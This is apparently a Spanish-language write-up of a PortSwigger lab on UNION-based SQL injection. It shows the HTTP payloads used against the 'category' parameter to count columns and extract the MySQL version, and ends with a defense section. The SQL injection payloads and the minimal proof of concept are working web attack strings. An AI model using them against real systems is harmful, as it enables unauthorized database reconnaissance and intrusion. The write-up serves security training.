---

id: sqli-04
title: "SQL injection attack, querying the database type and version on MySQL and Microsoft"
category: "SQLi"
difficulty: "Practitioner"
tags: \[portswigger, sqli, mysql, mssql, union, practitioner]
date: 2025-08-17
----------------

# SQL injection attack, querying the database type and version on MySQL and Microsoft

**Categoría:** SQLi
**Dificultad:** Practitioner
**Fuente:** PortSwigger Web Security Academy

---

# 🎯 Resumen

* **Objetivo del lab**: Usar un ataque UNION para extraer la cadena de versión de la base de datos.
* **Vulnerabilidad principal**: SQL Injection en parámetro `category`.
* **Impacto esperado**: Exposición de información sensible de la base de datos (tipo y versión exacta).

---

# 🧭 Reconocimiento

* **Parámetro vulnerable**: `category` en `/filter`.
* **Pruebas iniciales**:

  ```http
  GET /filter?category=Gifts'              # Rompe → inyección probable
  GET /filter?category=Gifts' order by 100-- -   # Rompe → demasiadas columnas
  GET /filter?category=Gifts' order by 2-- -     # 200 OK → 2 columnas
  ```
* **Hipótesis**: Motor compatible con funciones `@@version` y `version()` (MySQL/Microsoft SQL Server).

---

# 🛠️ Explotación paso a paso

## Paso 1 – Confirmar número de columnas

* **Qué hago**: Uso `ORDER BY`.
* **Por qué funciona**: Al pedir más columnas de las reales, la query falla.
* **Evidencia**: `order by 2` funciona, por tanto hay 2 columnas.

## Paso 2 – UNION SELECT básico

* **Qué hago**: `UNION SELECT 'TEST','TEST'-- -`
* **Por qué funciona**: Si aparece en pantalla, significa que controlo la salida.
* **Evidencia**: El texto *TEST* se muestra en la web.

## Paso 3 – Extraer versión con `@@version`

* **Qué hago**:

  ```http
  GET /filter?category=Gifts' union select @@version,'TEST'-- -
  ```
* **Por qué funciona**: En MySQL y Microsoft SQL Server, `@@version` devuelve la versión de la base de datos.
* **Evidencia**: Devuelve `8.0.42-0ubuntu0.20.04.1` → confirma MySQL.

## Paso 4 – Extraer versión con `version()`

* **Qué hago**:

  ```http
  GET /filter?category=Gifts' union select version(),'TEST'-- -
  ```
* **Por qué funciona**: En MySQL existe la función `version()` que devuelve la cadena de versión.
* **Evidencia**: Devuelve la misma versión → confirmación adicional.

---

# ✅ PoC mínima

```http
GET /filter?category=Gifts' union select @@version,'TEST'-- -
Host: <lab-id>.web-security-academy.net
```

Esto muestra la versión exacta de MySQL/Microsoft SQL Server.

---

# 🔒 Defensa

* **Causas**: Concatenación de entrada del usuario sin validación.
* **Detección en logs**:

  * Parámetros que incluyen `union select`, `@@version`, `version()`
  * Errores tras `'` en parámetros de URL
* **Mitigación recomendada**:

  * Consultas parametrizadas
  * Filtrar/validar entrada
  * Restringir funciones sensibles (`@@version`, `version()`) a usuarios de administración

---

# 📝 Notas y trampas

* **MySQL vs Oracle**:

  * En MySQL se puede usar `version()` o `@@version` sin necesidad de tabla dummy.
  * En Oracle se requiere `from DUAL`.
* **Microsoft SQL Server**: también soporta `@@version` pero devuelve una cadena mucho más larga con detalles del sistema operativo.
* El espacio tras `--` es importante: `-- -` para que lo interprete correctamente.

---

# 📚 Referencias

* [PortSwigger Lab – SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/union-attacks/lab-querying-database-version-mysql)
* [MySQL Documentation – version()](https://dev.mysql.com/doc/refman/8.0/en/information-functions.html#function_version)
* [Microsoft SQL Server – @@VERSION](https://learn.microsoft.com/en-us/sql/t-sql/functions/version-transact-sql)
* [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
